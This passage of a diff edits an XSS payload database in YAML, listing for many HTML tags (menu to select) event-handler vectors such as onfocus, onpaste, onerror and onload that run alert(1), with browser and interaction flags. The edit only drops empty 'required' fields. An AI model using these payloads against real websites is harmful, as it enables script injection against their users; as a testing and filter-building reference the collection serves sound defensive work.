     - <menu id=x tabindex=1 onfocus=alert(1)></menu>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4427,7 +3920,6 @@ menu:
   onfocusin:
     payloads:
     - <menu id=x tabindex=1 onfocusin=alert(1)></menu>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4435,7 +3927,6 @@ menu:
   onpaste:
     payloads:
     - <menu onpaste="alert(1)" contenteditable>test</menu>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4444,7 +3935,6 @@ menu:
   onshow:
     payloads:
     - <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
-    required: []
     interaction: true
     browsers:
     - firefox
@@ -4452,7 +3942,6 @@ menuitem:
   onbeforecopy:
     payloads:
     - <menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4461,7 +3950,6 @@ menuitem:
   onbeforecut:
     payloads:
     - <menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4470,7 +3958,6 @@ menuitem:
   onfocus:
     payloads:
     - <menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4478,7 +3965,6 @@ menuitem:
   onfocusin:
     payloads:
     - <menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4486,7 +3972,6 @@ menuitem:
   onpaste:
     payloads:
     - <menuitem onpaste="alert(1)" contenteditable>test</menuitem>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4496,7 +3981,6 @@ meta:
   onbeforecopy:
     payloads:
     - <meta onbeforecopy="alert(1)" contenteditable style=display:block>test</meta>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4505,7 +3989,6 @@ meta:
   onbeforecut:
     payloads:
     - <meta onbeforecut="alert(1)" contenteditable style=display:block>test</meta>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4514,7 +3997,6 @@ meta:
   onfocus:
     payloads:
     - <meta id=x tabindex=1 onfocus=alert(1) style=display:block></meta>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4522,7 +4004,6 @@ meta:
   onfocusin:
     payloads:
     - <meta id=x tabindex=1 onfocusin=alert(1) style=display:block></meta>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4530,7 +4011,6 @@ meta:
   onpaste:
     payloads:
     - <meta onpaste="alert(1)" contenteditable style=display:block>test</meta>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4540,7 +4020,6 @@ meter:
   onbeforecopy:
     payloads:
     - <meter onbeforecopy="alert(1)" contenteditable>test</meter>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4549,7 +4028,6 @@ meter:
   onbeforecut:
     payloads:
     - <meter onbeforecut="alert(1)" contenteditable>test</meter>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4558,7 +4036,6 @@ meter:
   onfocus:
     payloads:
     - <meter id=x tabindex=1 onfocus=alert(1)></meter>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4566,7 +4043,6 @@ meter:
   onfocusin:
     payloads:
     - <meter id=x tabindex=1 onfocusin=alert(1)></meter>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4574,7 +4050,6 @@ meter:
   onpaste:
     payloads:
     - <meter onpaste="alert(1)" contenteditable>test</meter>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4584,7 +4059,6 @@ multicol:
   onbeforecopy:
     payloads:
     - <multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4593,7 +4067,6 @@ multicol:
   onbeforecut:
     payloads:
     - <multicol onbeforecut="alert(1)" contenteditable>test</multicol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4602,7 +4075,6 @@ multicol:
   onfocus:
     payloads:
     - <multicol id=x tabindex=1 onfocus=alert(1)></multicol>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4610,7 +4082,6 @@ multicol:
   onfocusin:
     payloads:
     - <multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4618,7 +4089,6 @@ multicol:
   onpaste:
     payloads:
     - <multicol onpaste="alert(1)" contenteditable>test</multicol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4628,7 +4098,6 @@ nav:
   onbeforecopy:
     payloads:
     - <nav onbeforecopy="alert(1)" contenteditable>test</nav>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4637,7 +4106,6 @@ nav:
   onbeforecut:
     payloads:
     - <nav onbeforecut="alert(1)" contenteditable>test</nav>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4646,7 +4114,6 @@ nav:
   onfocus:
     payloads:
     - <nav id=x tabindex=1 onfocus=alert(1)></nav>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4654,7 +4121,6 @@ nav:
   onfocusin:
     payloads:
     - <nav id=x tabindex=1 onfocusin=alert(1)></nav>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4662,7 +4128,6 @@ nav:
   onpaste:
     payloads:
     - <nav onpaste="alert(1)" contenteditable>test</nav>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4672,7 +4137,6 @@ nextid:
   onbeforecopy:
     payloads:
     - <nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4681,7 +4145,6 @@ nextid:
   onbeforecut:
     payloads:
     - <nextid onbeforecut="alert(1)" contenteditable>test</nextid>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4690,7 +4153,6 @@ nextid:
   onfocus:
     payloads:
     - <nextid id=x tabindex=1 onfocus=alert(1)></nextid>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4698,7 +4160,6 @@ nextid:
   onfocusin:
     payloads:
     - <nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4706,7 +4167,6 @@ nextid:
   onpaste:
     payloads:
     - <nextid onpaste="alert(1)" contenteditable>test</nextid>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4716,7 +4176,6 @@ nobr:
   onbeforecopy:
     payloads:
     - <nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4725,7 +4184,6 @@ nobr:
   onbeforecut:
     payloads:
     - <nobr onbeforecut="alert(1)" contenteditable>test</nobr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4734,7 +4192,6 @@ nobr:
   onfocus:
     payloads:
     - <nobr id=x tabindex=1 onfocus=alert(1)></nobr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4742,7 +4199,6 @@ nobr:
   onfocusin:
     payloads:
     - <nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4750,7 +4206,6 @@ nobr:
   onpaste:
     payloads:
     - <nobr onpaste="alert(1)" contenteditable>test</nobr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4760,7 +4215,6 @@ noembed:
   onbeforecopy:
     payloads:
     - <noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4769,7 +4223,6 @@ noembed:
   onbeforecut:
     payloads:
     - <noembed onbeforecut="alert(1)" contenteditable>test</noembed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4778,7 +4231,6 @@ noembed:
   onfocus:
     payloads:
     - <noembed id=x tabindex=1 onfocus=alert(1)></noembed>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4786,7 +4238,6 @@ noembed:
   onfocusin:
     payloads:
     - <noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4794,7 +4245,6 @@ noembed:
   onpaste:
     payloads:
     - <noembed onpaste="alert(1)" contenteditable>test</noembed>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4804,7 +4254,6 @@ noframes:
   onbeforecopy:
     payloads:
     - <noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4813,7 +4262,6 @@ noframes:
   onbeforecut:
     payloads:
     - <noframes onbeforecut="alert(1)" contenteditable>test</noframes>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4822,7 +4270,6 @@ noframes:
   onfocus:
     payloads:
     - <noframes id=x tabindex=1 onfocus=alert(1)></noframes>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4830,7 +4277,6 @@ noframes:
   onfocusin:
     payloads:
     - <noframes id=x tabindex=1 onfocusin=alert(1)></noframes>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4838,7 +4284,6 @@ noframes:
   onpaste:
     payloads:
     - <noframes onpaste="alert(1)" contenteditable>test</noframes>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4848,7 +4293,6 @@ noscript:
   onbeforecopy:
     payloads:
     - <noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4857,7 +4301,6 @@ noscript:
   onbeforecut:
     payloads:
     - <noscript onbeforecut="alert(1)" contenteditable>test</noscript>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4866,7 +4309,6 @@ noscript:
   onfocus:
     payloads:
     - <noscript id=x tabindex=1 onfocus=alert(1)></noscript>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4874,7 +4316,6 @@ noscript:
   onfocusin:
     payloads:
     - <noscript id=x tabindex=1 onfocusin=alert(1)></noscript>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4882,7 +4323,6 @@ noscript:
   onpaste:
     payloads:
     - <noscript onpaste="alert(1)" contenteditable>test</noscript>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4892,7 +4332,6 @@ object:
   onbeforecopy:
     payloads:
     - <object onbeforecopy="alert(1)" contenteditable>test</object>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4901,7 +4340,6 @@ object:
   onbeforecut:
     payloads:
     - <object onbeforecut="alert(1)" contenteditable>test</object>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4910,14 +4348,12 @@ object:
   onerror:
     payloads:
     - <object onerror=alert(1) data=1 type=image/gif>
-    required: []
     interaction: false
     browsers:
     - firefox
   onfocus:
     payloads:
     - <object id=x onfocus=alert(1) type=text/html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4925,7 +4361,6 @@ object:
   onfocusin:
     payloads:
     - <object id=x onfocusin=alert(1) type=text/html>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4933,7 +4368,6 @@ object:
   onload:
     payloads:
     - <object data=/ onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4942,7 +4376,6 @@ object:
   onpaste:
     payloads:
     - <object onpaste="alert(1)" contenteditable>test</object>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4952,7 +4385,6 @@ ol:
   onbeforecopy:
     payloads:
     - <ol onbeforecopy="alert(1)" contenteditable>test</ol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4961,7 +4393,6 @@ ol:
   onbeforecut:
     payloads:
     - <ol onbeforecut="alert(1)" contenteditable>test</ol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4970,7 +4401,6 @@ ol:
   onfocus:
     payloads:
     - <ol id=x tabindex=1 onfocus=alert(1)></ol>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4978,7 +4408,6 @@ ol:
   onfocusin:
     payloads:
     - <ol id=x tabindex=1 onfocusin=alert(1)></ol>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -4986,7 +4415,6 @@ ol:
   onpaste:
     payloads:
     - <ol onpaste="alert(1)" contenteditable>test</ol>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -4996,7 +4424,6 @@ optgroup:
   onbeforecopy:
     payloads:
     - <optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5005,7 +4432,6 @@ optgroup:
   onbeforecut:
     payloads:
     - <optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5014,7 +4440,6 @@ optgroup:
   onfocus:
     payloads:
     - <optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5022,7 +4447,6 @@ optgroup:
   onfocusin:
     payloads:
     - <optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5030,7 +4454,6 @@ optgroup:
   onpaste:
     payloads:
     - <optgroup onpaste="alert(1)" contenteditable>test</optgroup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5040,7 +4463,6 @@ option:
   onbeforecopy:
     payloads:
     - <option onbeforecopy="alert(1)" contenteditable>test</option>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5049,7 +4471,6 @@ option:
   onbeforecut:
     payloads:
     - <option onbeforecut="alert(1)" contenteditable>test</option>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5058,7 +4479,6 @@ option:
   onfocus:
     payloads:
     - <option id=x tabindex=1 onfocus=alert(1)></option>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5066,7 +4486,6 @@ option:
   onfocusin:
     payloads:
     - <option id=x tabindex=1 onfocusin=alert(1)></option>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5074,7 +4493,6 @@ option:
   onpaste:
     payloads:
     - <option onpaste="alert(1)" contenteditable>test</option>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5084,7 +4502,6 @@ output:
   onbeforecopy:
     payloads:
     - <output onbeforecopy="alert(1)" contenteditable>test</output>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5093,7 +4510,6 @@ output:
   onbeforecut:
     payloads:
     - <output onbeforecut="alert(1)" contenteditable>test</output>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5102,7 +4518,6 @@ output:
   onfocus:
     payloads:
     - <output id=x tabindex=1 onfocus=alert(1)></output>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5110,7 +4525,6 @@ output:
   onfocusin:
     payloads:
     - <output id=x tabindex=1 onfocusin=alert(1)></output>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5118,7 +4532,6 @@ output:
   onpaste:
     payloads:
     - <output onpaste="alert(1)" contenteditable>test</output>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5128,7 +4541,6 @@ p:
   onbeforecopy:
     payloads:
     - <p onbeforecopy="alert(1)" contenteditable>test</p>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5137,7 +4549,6 @@ p:
   onbeforecut:
     payloads:
     - <p onbeforecut="alert(1)" contenteditable>test</p>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5146,7 +4557,6 @@ p:
   onfocus:
     payloads:
     - <p id=x tabindex=1 onfocus=alert(1)></p>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5154,7 +4564,6 @@ p:
   onfocusin:
     payloads:
     - <p id=x tabindex=1 onfocusin=alert(1)></p>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5162,7 +4571,6 @@ p:
   onpaste:
     payloads:
     - <p onpaste="alert(1)" contenteditable>test</p>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5172,7 +4580,6 @@ param:
   onbeforecopy:
     payloads:
     - <param onbeforecopy="alert(1)" contenteditable>test</param>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5181,7 +4588,6 @@ param:
   onbeforecut:
     payloads:
     - <param onbeforecut="alert(1)" contenteditable>test</param>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5190,7 +4596,6 @@ param:
   onfocus:
     payloads:
     - <param id=x tabindex=1 onfocus=alert(1)></param>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5198,7 +4603,6 @@ param:
   onfocusin:
     payloads:
     - <param id=x tabindex=1 onfocusin=alert(1)></param>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5206,7 +4610,6 @@ param:
   onpaste:
     payloads:
     - <param onpaste="alert(1)" contenteditable>test</param>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5216,7 +4619,6 @@ picture:
   onbeforecopy:
     payloads:
     - <picture onbeforecopy="alert(1)" contenteditable>test</picture>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5225,7 +4627,6 @@ picture:
   onbeforecut:
     payloads:
     - <picture onbeforecut="alert(1)" contenteditable>test</picture>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5234,7 +4635,6 @@ picture:
   onfocus:
     payloads:
     - <picture id=x tabindex=1 onfocus=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5242,7 +4642,6 @@ picture:
   onfocusin:
     payloads:
     - <picture id=x tabindex=1 onfocusin=alert(1)></picture>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5250,7 +4649,6 @@ picture:
   onpaste:
     payloads:
     - <picture onpaste="alert(1)" contenteditable>test</picture>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5260,7 +4658,6 @@ plaintext:
   onbeforecopy:
     payloads:
     - <plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5269,7 +4666,6 @@ plaintext:
   onbeforecut:
     payloads:
     - <plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5278,7 +4674,6 @@ plaintext:
   onfocus:
     payloads:
     - <plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5286,7 +4681,6 @@ plaintext:
   onfocusin:
     payloads:
     - <plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5294,7 +4688,6 @@ plaintext:
   onpaste:
     payloads:
     - <plaintext onpaste="alert(1)" contenteditable>test</plaintext>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5304,7 +4697,6 @@ pre:
   onbeforecopy:
     payloads:
     - <pre onbeforecopy="alert(1)" contenteditable>test</pre>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5313,7 +4705,6 @@ pre:
   onbeforecut:
     payloads:
     - <pre onbeforecut="alert(1)" contenteditable>test</pre>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5322,7 +4713,6 @@ pre:
   onfocus:
     payloads:
     - <pre id=x tabindex=1 onfocus=alert(1)></pre>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5330,7 +4720,6 @@ pre:
   onfocusin:
     payloads:
     - <pre id=x tabindex=1 onfocusin=alert(1)></pre>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5338,7 +4727,6 @@ pre:
   onpaste:
     payloads:
     - <pre onpaste="alert(1)" contenteditable>test</pre>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5348,7 +4736,6 @@ progress:
   onbeforecopy:
     payloads:
     - <progress onbeforecopy="alert(1)" contenteditable>test</progress>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5357,7 +4744,6 @@ progress:
   onbeforecut:
     payloads:
     - <progress onbeforecut="alert(1)" contenteditable>test</progress>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5366,7 +4752,6 @@ progress:
   onfocus:
     payloads:
     - <progress id=x tabindex=1 onfocus=alert(1)></progress>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5374,7 +4759,6 @@ progress:
   onfocusin:
     payloads:
     - <progress id=x tabindex=1 onfocusin=alert(1)></progress>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5382,7 +4766,6 @@ progress:
   onpaste:
     payloads:
     - <progress onpaste="alert(1)" contenteditable>test</progress>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5392,7 +4775,6 @@ q:
   onbeforecopy:
     payloads:
     - <q onbeforecopy="alert(1)" contenteditable>test</q>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5401,7 +4783,6 @@ q:
   onbeforecut:
     payloads:
     - <q onbeforecut="alert(1)" contenteditable>test</q>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5410,7 +4791,6 @@ q:
   onfocus:
     payloads:
     - <q id=x tabindex=1 onfocus=alert(1)></q>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5418,7 +4798,6 @@ q:
   onfocusin:
     payloads:
     - <q id=x tabindex=1 onfocusin=alert(1)></q>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5426,7 +4805,6 @@ q:
   onpaste:
     payloads:
     - <q onpaste="alert(1)" contenteditable>test</q>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5436,7 +4814,6 @@ rb:
   onbeforecopy:
     payloads:
     - <rb onbeforecopy="alert(1)" contenteditable>test</rb>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5445,7 +4822,6 @@ rb:
   onbeforecut:
     payloads:
     - <rb onbeforecut="alert(1)" contenteditable>test</rb>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5454,7 +4830,6 @@ rb:
   onfocus:
     payloads:
     - <rb id=x tabindex=1 onfocus=alert(1)></rb>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5462,7 +4837,6 @@ rb:
   onfocusin:
     payloads:
     - <rb id=x tabindex=1 onfocusin=alert(1)></rb>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5470,7 +4844,6 @@ rb:
   onpaste:
     payloads:
     - <rb onpaste="alert(1)" contenteditable>test</rb>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5480,7 +4853,6 @@ rp:
   onbeforecopy:
     payloads:
     - <rp onbeforecopy="alert(1)" contenteditable>test</rp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5489,7 +4861,6 @@ rp:
   onbeforecut:
     payloads:
     - <rp onbeforecut="alert(1)" contenteditable>test</rp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5498,7 +4869,6 @@ rp:
   onfocus:
     payloads:
     - <rp id=x tabindex=1 onfocus=alert(1)></rp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5506,7 +4876,6 @@ rp:
   onfocusin:
     payloads:
     - <rp id=x tabindex=1 onfocusin=alert(1)></rp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5514,7 +4883,6 @@ rp:
   onpaste:
     payloads:
     - <rp onpaste="alert(1)" contenteditable>test</rp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5524,7 +4892,6 @@ rt:
   onbeforecopy:
     payloads:
     - <rt onbeforecopy="alert(1)" contenteditable>test</rt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5533,7 +4900,6 @@ rt:
   onbeforecut:
     payloads:
     - <rt onbeforecut="alert(1)" contenteditable>test</rt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5542,7 +4908,6 @@ rt:
   onfocus:
     payloads:
     - <rt id=x tabindex=1 onfocus=alert(1)></rt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5550,7 +4915,6 @@ rt:
   onfocusin:
     payloads:
     - <rt id=x tabindex=1 onfocusin=alert(1)></rt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5558,7 +4922,6 @@ rt:
   onpaste:
     payloads:
     - <rt onpaste="alert(1)" contenteditable>test</rt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5568,7 +4931,6 @@ rtc:
   onbeforecopy:
     payloads:
     - <rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5577,7 +4939,6 @@ rtc:
   onbeforecut:
     payloads:
     - <rtc onbeforecut="alert(1)" contenteditable>test</rtc>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5586,7 +4947,6 @@ rtc:
   onfocus:
     payloads:
     - <rtc id=x tabindex=1 onfocus=alert(1)></rtc>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5594,7 +4954,6 @@ rtc:
   onfocusin:
     payloads:
     - <rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5602,7 +4961,6 @@ rtc:
   onpaste:
     payloads:
     - <rtc onpaste="alert(1)" contenteditable>test</rtc>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5612,7 +4970,6 @@ ruby:
   onbeforecopy:
     payloads:
     - <ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5621,7 +4978,6 @@ ruby:
   onbeforecut:
     payloads:
     - <ruby onbeforecut="alert(1)" contenteditable>test</ruby>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5630,7 +4986,6 @@ ruby:
   onfocus:
     payloads:
     - <ruby id=x tabindex=1 onfocus=alert(1)></ruby>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5638,7 +4993,6 @@ ruby:
   onfocusin:
     payloads:
     - <ruby id=x tabindex=1 onfocusin=alert(1)></ruby>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5646,7 +5000,6 @@ ruby:
   onpaste:
     payloads:
     - <ruby onpaste="alert(1)" contenteditable>test</ruby>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5656,7 +5009,6 @@ s:
   onbeforecopy:
     payloads:
     - <s onbeforecopy="alert(1)" contenteditable>test</s>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5665,7 +5017,6 @@ s:
   onbeforecut:
     payloads:
     - <s onbeforecut="alert(1)" contenteditable>test</s>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5674,7 +5025,6 @@ s:
   onfocus:
     payloads:
     - <s id=x tabindex=1 onfocus=alert(1)></s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5682,7 +5032,6 @@ s:
   onfocusin:
     payloads:
     - <s id=x tabindex=1 onfocusin=alert(1)></s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5690,7 +5039,6 @@ s:
   onpaste:
     payloads:
     - <s onpaste="alert(1)" contenteditable>test</s>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5700,7 +5048,6 @@ samp:
   onbeforecopy:
     payloads:
     - <samp onbeforecopy="alert(1)" contenteditable>test</samp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5709,7 +5056,6 @@ samp:
   onbeforecut:
     payloads:
     - <samp onbeforecut="alert(1)" contenteditable>test</samp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5718,7 +5064,6 @@ samp:
   onfocus:
     payloads:
     - <samp id=x tabindex=1 onfocus=alert(1)></samp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5726,7 +5071,6 @@ samp:
   onfocusin:
     payloads:
     - <samp id=x tabindex=1 onfocusin=alert(1)></samp>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5734,7 +5078,6 @@ samp:
   onpaste:
     payloads:
     - <samp onpaste="alert(1)" contenteditable>test</samp>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5744,7 +5087,6 @@ script:
   onbeforecopy:
     payloads:
     - <script onbeforecopy="alert(1)" contenteditable>test</script>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5753,7 +5095,6 @@ script:
   onbeforecut:
     payloads:
     - <script onbeforecut="alert(1)" contenteditable>test</script>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5762,7 +5103,6 @@ script:
   onerror:
     payloads:
     - <script onerror=alert(1) src=/></script>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5771,7 +5111,6 @@ script:
   onfocus:
     payloads:
     - <script id=x tabindex=1 onfocus=alert(1)></script>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5779,7 +5118,6 @@ script:
   onfocusin:
     payloads:
     - <script id=x tabindex=1 onfocusin=alert(1)></script>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5787,7 +5125,6 @@ script:
   onload:
     payloads:
     - <script onload=alert(1) src=validjs.js></script>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5796,7 +5133,6 @@ script:
   onpaste:
     payloads:
     - <script onpaste="alert(1)" contenteditable>test</script>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5806,7 +5142,6 @@ section:
   onbeforecopy:
     payloads:
     - <section onbeforecopy="alert(1)" contenteditable>test</section>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5815,7 +5150,6 @@ section:
   onbeforecut:
     payloads:
     - <section onbeforecut="alert(1)" contenteditable>test</section>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5824,7 +5158,6 @@ section:
   onfocus:
     payloads:
     - <section id=x tabindex=1 onfocus=alert(1)></section>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5832,7 +5165,6 @@ section:
   onfocusin:
     payloads:
     - <section id=x tabindex=1 onfocusin=alert(1)></section>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5840,7 +5172,6 @@ section:
   onpaste:
     payloads:
     - <section onpaste="alert(1)" contenteditable>test</section>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5850,7 +5181,6 @@ select:
   onbeforecopy:
     payloads:
     - <select onbeforecopy="alert(1)" contenteditable>test</select>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5859,7 +5189,6 @@ select:
   onbeforecut:
     payloads:
